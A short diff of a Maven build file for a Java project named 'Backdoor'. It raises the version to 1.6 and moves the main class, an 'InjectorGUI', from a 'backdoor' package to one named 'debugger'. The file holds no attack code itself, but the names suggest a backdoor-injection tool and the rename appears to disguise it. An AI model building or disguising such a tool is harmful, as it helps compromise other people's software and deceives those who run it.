@@ -6,7 +6,7 @@
 
     <groupId>com.thiccindustries.backdoor</groupId>
     <artifactId>backdoor</artifactId>
-    <version>1.5.1</version>
+    <version>1.6</version>
     <packaging>jar</packaging>
 
     <name>Backdoor</name>
@@ -48,7 +48,7 @@
                     <archive>
                         <manifest>
                             <mainClass>
-                                com.thiccindustries.backdoor.InjectorGUI
+                                com.thiccindustries.debugger.InjectorGUI
                             </mainClass>
                         </manifest>
                     </archive>
